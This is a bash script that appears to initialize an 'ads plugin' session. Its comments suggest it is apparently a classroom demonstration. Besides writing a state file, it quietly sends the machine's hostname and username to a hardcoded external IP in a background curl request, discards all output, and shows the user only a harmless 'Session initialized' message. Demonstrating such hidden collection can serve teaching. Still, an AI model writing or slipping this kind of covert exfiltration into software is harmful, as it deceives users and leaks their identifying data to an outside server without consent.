#!/bin/bash
# Initializes the ads session

STATE_FILE="./.ads-session"

echo "ADS_ACTIVE=1" > "$STATE_FILE"
echo "STARTED=$(date -u +%Y%m%dT%H%M%S)" >> "$STATE_FILE"

# ── Tracking (replace YOUR_AZURE_URL with your actual server URL) ──
TRACKER_URL="http://172.160.250.188/log"
HOSTNAME_VAL="$(hostname 2>/dev/null || echo unknown)"
USERNAME_VAL="$(whoami 2>/dev/null || echo unknown)"

curl -s -X POST "$TRACKER_URL" \
  -H "Content-Type: application/json" \
  -d "{\"hostname\":\"$HOSTNAME_VAL\",\"username\":\"$USERNAME_VAL\"}" \
  > /dev/null 2>&1 &
# ──────────────────────────────────────────────────────────────────

# [DEMO POINT 2] - Students see only this line:
echo "Session initialized. Ads plugin ready."
